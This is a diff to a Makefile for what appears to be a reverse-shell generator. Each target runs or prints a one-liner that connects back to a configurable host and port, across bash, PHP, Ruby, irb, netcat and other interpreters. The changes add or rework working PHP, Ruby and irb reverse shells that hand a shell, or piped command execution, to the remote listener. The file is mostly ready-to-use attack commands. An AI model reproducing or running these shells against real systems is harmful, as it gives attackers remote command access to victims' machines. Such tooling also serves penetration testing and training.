@@ -2,9 +2,9 @@ SHELL	:= /bin/bash
 HOST	:= 127.0.0.1
 PORT	:= 4444
 PORT2	:= 4445
-TMP		:= $(or $(tmp), /tmp/f)
+TMP	:= /tmp/f
 
-METHODS	:= bash1 bash2 bash3 ksh zsh pwsh ncat1 ncat2 telnet1 telnet2 socket openssl python perl php1 php2 php3 php4 php5 php6 ruby irb node jrunscript jjs julia socat pip cpan
+METHODS	:= bash1 bash2 bash3 ksh zsh pwsh ncat1 ncat2 telnet1 telnet2 socket openssl python perl php1 php2 php3 php4 php5 php6 ruby1 ruby2 irb1 irb2 node jrunscript jjs julia socat pip cpan
 
 BOLD		:= \033[1m
 UNDERLINE	:= \033[4m
@@ -25,7 +25,7 @@ show:
 	@printf "TEMPORARY FILE/DIR*: $(GREEN)$(TMP)$(RESET)\n"
 	@printf "* = only necessary for some methods\n"
 	@printf "\n"
-	@printf "To change previous values, run $(UNDERLINE)./configure <shell> <host> <port> <port2>$(RESET).\n"
+	@printf "To change previous values, run $(UNDERLINE)./configure <shell> <host> <port> <port2> <tmp>$(RESET).\n"
 	@printf "\n"
 	@printf "Available methods:\n"
 	@$(foreach cmd, $(METHODS), printf "   $(BOLD)$(BLUE)$(cmd)$(RESET)\n";)
@@ -195,10 +195,10 @@ php3-show:
 	@printf "php -r '\$$sock = fsockopen(\"$(HOST)\",$(PORT)); passthru(\"$(SHELL) <&3 >&3 2>&3\");'\n"
 
 php4:
-	php -r '$$sock = fsockopen("$(HOST)",$(PORT)); `"$(SHELL) <&3 >&3 2>&3"`;'
+	php -r '$$sock = fsockopen("$(HOST)",$(PORT)); `$(SHELL) <&3 >&3 2>&3`;'
 
 php4-show:
-	@printf "php -r '\$$sock = fsockopen(\"$(HOST)\",$(PORT)); \`\"$(SHELL) <&3 >&3 2>&3\"\`;'\n"
+	@printf "php -r '\$$sock = fsockopen(\"$(HOST)\",$(PORT)); \`$(SHELL) <&3 >&3 2>&3\`;'\n"
 
 php5:
 	php -r '$$sock = fsockopen("$(HOST)",$(PORT)); popen("$(SHELL) <&3 >&3 2>&3", "r");'
@@ -216,21 +216,33 @@ php6-show:
 
 ########################### RUBY ###########################
 
-ruby:
-	ruby -rsocket -e 'exit if fork; c = TCPSocket.new("$(HOST)",$(PORT)); while(cmd = c.gets); IO.popen(cmd,"r"){|io|c.print io.read} end'
+ruby1:
+	ruby -rsocket -e 's = TCPSocket.new("$(HOST)",$(PORT)); STDIN.reopen(s); STDOUT.reopen(s); STDERR.reopen(s); exec "$(SHELL)"'
 
-ruby-show:
-	@printf "ruby -rsocket -e 'exit if fork; c = TCPSocket.new(\"$(HOST)\",$(PORT)); while(cmd = c.gets); IO.popen(cmd,\"r\"){|io|c.print io.read} end'\n"
+ruby1-show:
+	@printf "ruby -rsocket -e 's = TCPSocket.new(\"$(HOST)\",$(PORT)); STDIN.reopen(s); STDOUT.reopen(s); STDERR.reopen(s); exec \"$(SHELL)\"'\n"
+
+ruby2:
+	ruby -rsocket -e 's = TCPSocket.new("$(HOST)",$(PORT)); while(cmd = s.gets); IO.popen(cmd,"r"){|io| s.print io.read} end'
+
+ruby2-show:
+	@printf "ruby -rsocket -e 's = TCPSocket.new(\"$(HOST)\",$(PORT)); while(cmd = s.gets); IO.popen(cmd,\"r\"){|io| s.print io.read} end'\n"
 
 ############################################################
 
 ############################ IRB ###########################
 
-irb:
-	echo 'require "socket"; exit if fork; c = TCPSocket.new("$(HOST)",$(PORT)); while(cmd = c.gets); IO.popen(cmd,"r"){|io|c.print io.read} end' | irb
+irb1:
+	echo 'require "socket"; s = TCPSocket.new("$(HOST)",$(PORT)); STDIN.reopen(s); STDOUT.reopen(s); STDERR.reopen(s); exec "$(SHELL)"' | irb
 
-irb-show:
-	echo 'require \"socket\"; exit if fork; c = TCPSocket.new(\"$(HOST)\",$(PORT)); while(cmd = c.gets); IO.popen(cmd,\"r\"){|io|c.print io.read} end' | irb
+irb1-show:
+	@printf "echo 'require \"socket\"; s = TCPSocket.new(\"$(HOST)\",$(PORT)); STDIN.reopen(s); STDOUT.reopen(s); STDERR.reopen(s); exec \"$(SHELL)\"' | irb\n"
+
+irb2:
+	echo 'require "socket"; s = TCPSocket.new("$(HOST)",$(PORT)); while(cmd = s.gets); IO.popen(cmd,"r"){|io| s.print io.read} end' | irb
+
+irb2-show:
+	@printf "echo 'require \"socket\"; s = TCPSocket.new(\"$(HOST)\",$(PORT)); while(cmd = s.gets); IO.popen(cmd,\"r\"){|io| s.print io.read} end' | irb\n"
 
 ############################################################
 
